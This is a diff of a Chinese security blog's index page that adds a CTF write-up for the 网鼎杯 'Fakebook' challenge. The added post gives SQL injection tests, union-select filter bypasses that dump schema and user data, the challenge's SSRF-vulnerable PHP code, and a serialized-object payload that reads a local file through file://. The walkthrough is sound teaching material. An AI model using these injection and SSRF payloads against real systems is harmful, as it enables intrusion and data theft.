@@ -589,68 +589,6 @@ echo &quot;)&lt;br&gt;&quot;;</code></pre><p>最后将得到的源码进行base6
 
 
   
-    <article id="post-Linux-Shell-Upgrade" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/15/Linux-Shell-Upgrade/">Linux Shell-Upgrade</a>
-    </h1>
-  
-
-        
-        <a href="/2020/04/15/Linux-Shell-Upgrade/" class="archive-article-date">
-  	<time datetime="2020-04-15T13:05:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/04/15/Linux-Shell-Upgrade/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
     <article id="post-Nmap" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1300,6 +1238,130 @@ print(res.text)</code></pre><h3 id="总结"><a href="#总结" class="headerlink"
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2020/04/10/SSRF-me/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Fakebook" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/07/Fakebook/">Fakebook</a>
+    </h1>
+  
+
+        
+        <a href="/2020/04/07/Fakebook/" class="archive-article-date">
+  	<time datetime="2020-04-07T09:02:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-07</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="网鼎杯——Fakebook"><a href="#网鼎杯——Fakebook" class="headerlink" title="网鼎杯——Fakebook"></a>网鼎杯——Fakebook</h3><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>1、sql注入<br>2、PHP反序列化<br>3、ssrf漏洞</p>
+<p>首先发现主页面有两个功能（login、join）。注册后，查看用户信息页面，发现Url可能存在sql注入；<br><img src="../images/16.jpg" alt="1"><br>尝试</p>
+<pre><code>?no=1 and 1=1#
+?no=1 and 1=2#</code></pre><p>的确存在数字型sql注入；接下来尝试猜测sql查询语句中有几列列名：结果为4列<br><img src="../images/15.jpg" alt="2"><br>接下来就是爆库名、表名、列名；但发现union select被过滤。此时可以有已下几种思路绕过：<br>（1）双写绕过（若只删除第一个匹配的内容，即可绕过）：seselectlect,ununionion<br>（2）大小写绕过：SeLect、UniOn<br>（3）注释符绕过：u/**/nion/<strong>/se/\</strong>/lect<br>对于这道题，可以使用union/**/select绕过。爆出库名、表名、列名：</p>
+<pre><code>?no=-1 union/**/select 1,database(),3,4# 库名为“fakebook”
+?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&quot;fakebook&quot;# 表名为“users”
+?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&quot;users&quot;# 列名如下
+?no=-1 union/**/select 1,group_concat(username,passwd,data),3,4 from users#</code></pre><p><img src="../images/17.jpg" alt="3"><br><img src="../images/18.jpg" alt="4"><br>但是做到这一步后思路没了，从爆出的数据可以发现data列是将我们注册的相关信息序列化后存储于数据库中，我感觉可能跟这个序列化数据有关系，但不知道怎么利用；后来看了wp，发现还可以查看robots.php，查看源码（有师傅说是御剑扫出来的…怎么我的御剑就没扫出来呢…）；<br>源码如下：</p>
+<pre><code>&lt;?php
+class UserInfo
+{
+    public $name = &quot;&quot;;
+    public $age = 0;
+    public $blog = &quot;&quot;;
+}
+    public function __construct($name, $age, $blog) //看到魔术函数，想到序列化
+{
+    $this-&gt;name = $name;
+    $this-&gt;age = (int)$age;
+    $this-&gt;blog = $blog;
+}
+
+function get($url) //存在ssrf漏洞
+{
+    $ch = curl_init();
+
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    $output = curl_exec($ch);//将请求的网页内容返回给output
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    if($httpCode == 404) {
+        return 404;
+    }
+    curl_close($ch);
+
+    return $output;
+}
+
+public function getBlogContents () 
+{
+    return $this-&gt;get($this-&gt;blog);//将blog变量传入get函数中，由于blog变量用户可控；可以利用这一点，构造payload；
+}
+
+public function isValidBlog () //判断blog输入格式是否符合要求
+{
+    $blog = $this-&gt;blog;
+    return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);
+}
+}</code></pre><p>通过代码审计，我们发现get（）函数存在ssrf漏洞，由于blog变量用户可控，那么就可利用这一点。<br>这里有一个关键的地方，需要我们自己去猜想：很有可能是将用户注册的个人信息序列化后，存储到数据库中；再将data列中blog的内容提取出来经过反序列化后，进行加载（SSRF漏洞）。这里附上view.php源码<br><img src="../images/19.jpg" alt="5"><br>既然如此，我们可以利用sql注入将构造好的序列化内容注入到数据库中，当从数据库中提取构造好的内容时，自然会加载得到我们想要的内容；可以使用file://协议进行读取。<br>这里存在一个小问题，目标文件路径并不清楚；但从之前报错的信息来看为/var/www/html;猜测文件名为flag.php（有师傅说这个也可以扫出来….）所以就可以使blog=file:///var/www/html/flag.php<br>下面将个人信息进行序列化，注入到数据库中；</p>
+<pre><code>O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:3:&quot;aaa&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}</code></pre><p>这里注意，因为序列化内容对应的是第四列，因此payload为：</p>
+<pre><code>?no=-1 union/**/select 1,2,3,&apos;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:3:&quot;aaa&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}&apos;#</code></pre><p>查看源码，base64解码即可得到flag：<br>flag{c58e6648-1cad-4546-83c3-b09769087157}<br>###小结<br>这道题主要考察了sql注入、ssrf、php反序列化漏洞三个知识点；<br>（1）sql注入主要考察如何绕过union select过滤；这里我学到一个小知识，以前习惯性认为select语句只能用于查询，而这道题却是通过select语句将构造好的内容注入进数据库中；本地测试了一下；发现union联合的两句select语句，会将第二句select的查找对象“暂时性”存入前面select语句所对应的查询数据库中；这也是这道题为什么可以把内容存入数据库的原因；<br><img src="../images/20.jpg" alt="6"><br><img src="../images/21.jpg" alt="7"><br>拓展一下：其实爆库、表名、列名最主要依靠的是information_schema这个库，如果这个库被ban了咋办呢?卖个关子，下回分解；<br>（2）这里ssrf漏洞利用了file协议读取某个文件。除此之外常用的还有gopher、dict协议等，后续文章会详细介绍；<br>（3）这里主要是将用户信息先进行序列化后存入数据库；看到_construct()构造函数就得猜测是否有反序列化漏洞；</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">sql,PHP反序列化,ssrf</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/04/07/Fakebook/">展开全文 >></a>
         </p>
       
 
